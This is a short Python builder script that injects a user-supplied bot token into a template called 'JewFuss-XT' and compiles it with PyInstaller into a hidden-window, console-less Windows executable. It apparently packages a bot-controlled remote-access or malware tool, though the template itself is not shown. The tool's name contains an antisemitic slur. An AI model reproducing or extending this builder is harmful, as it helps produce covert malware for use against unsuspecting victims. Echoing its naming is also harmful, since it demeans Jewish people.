import os,shutil,tempfile,subprocess
def replace_token(template_path,token,replacement):
	with open(template_path,'r')as file:content=file.read()
	content=content.replace(token,replacement);return content
def compile_with_token(template_path,token,output_path):
	user_input='TOKEN = "'+input('Please enter bot token:\n>> ')+'"';replaced_content=replace_token(template_path,token,user_input);temp_dir=tempfile.mkdtemp();temp_file=os.path.join(temp_dir,'temp.py')
	with open(temp_file,'w')as file:file.write(replaced_content)
	subprocess.run(['pyinstaller',temp_file,'--onefile','--windowed','--noconsole','-n JewFuss-XT.exe']);shutil.rmtree(temp_dir)
template_path='./source/JewFuss-XT.template'
output_path='./dist/JewFuss-XT.exe'
token='TOKEN = "BOT-TOKEN-GOES-HERE"'
compile_with_token(template_path,token,output_path)